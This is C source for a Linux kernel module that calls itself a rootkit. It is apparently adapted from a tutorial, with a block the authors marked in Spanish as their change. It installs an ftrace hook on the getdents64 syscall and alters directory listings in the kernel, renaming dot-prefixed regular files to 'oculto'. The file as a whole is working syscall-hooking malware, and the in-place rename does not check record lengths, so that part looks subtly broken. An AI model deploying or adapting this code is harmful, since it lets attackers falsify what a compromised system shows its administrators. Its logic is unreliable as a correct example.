#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding files that start with a certain prefix");
MODULE_VERSION("0.02");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_getdents64 and hook_getdents64 functions differently
 * depending on the kernel version. This is the larget barrier to
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
	// Aqui comienza el bloque modificado por nosotros
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

		if (current_dir->d_reclen == 0 || offset + current_dir->d_reclen > ret)
            break;

        // Solo dejar pasar archivos
		 if (current_dir->d_type != DT_REG) {
            offset += current_dir->d_reclen;
            continue;
        }

        /* Comparamos si el primer digito es un punto, ya que
		en Linux es un estandar "ocultar" archivos con el punto */
        if (current_dir->d_name[0] == '.')
        {
            strncpy(current_dir->d_name, "oculto", 6);
            current_dir->d_name[6] = '\0';
        }
        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }
	// Aqui termina el bloque modificado por nosotros

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}
#endif

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);